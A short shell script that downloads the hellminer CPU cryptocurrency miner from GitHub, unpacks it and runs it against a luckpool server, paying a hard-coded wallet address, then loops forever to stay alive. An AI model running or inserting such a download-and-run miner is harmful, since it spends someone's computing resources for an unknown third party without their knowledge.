#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u 0x81a56241eb51cddee67f5de03c7368bd3aa2362b.cortexx -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999